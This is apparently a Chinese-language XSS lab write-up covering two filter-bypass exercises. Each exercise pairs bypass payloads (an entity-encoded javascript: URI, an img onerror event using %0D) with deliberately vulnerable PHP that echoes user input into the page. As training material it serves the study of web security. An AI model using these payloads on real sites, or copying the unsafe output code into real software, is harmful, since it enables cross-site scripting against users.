#### filter1:替换关键字以及url检测
思路:html实体编码绕过关键字,使用注释符后加http://绕过校验(或者使用伪协议支持%0d容错性换行解析)
payload1:```javas&#x63ript:alert(1)//http://www.baidu.com```
payload2:```javas&#x63ript:%0dhttp://www.baidu.com%0dalert(1)```
```
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=index.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
```
![](https://github.com/Conanjun/xss-vulnhub/blob/master/filters-bypass/filter1/1.png)

#### filte2 替换关键字
思路:过滤了script可以用on事件，过滤了空格可以用%0d%0a绕过
payload:```<img%0Dsrc=1%0Donerror=alert(1)>```
```
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","&nbsp;",$str);
$str3=str_replace(" ","&nbsp;",$str2);
$str4=str_replace("/","&nbsp;",$str3);
$str5=str_replace("	","&nbsp;",$str4);
echo "<center>".$str5."</center>";
?>
```
![](https://github.com/Conanjun/xss-vulnhub/blob/master/filters-bypass/filter2/1.png)
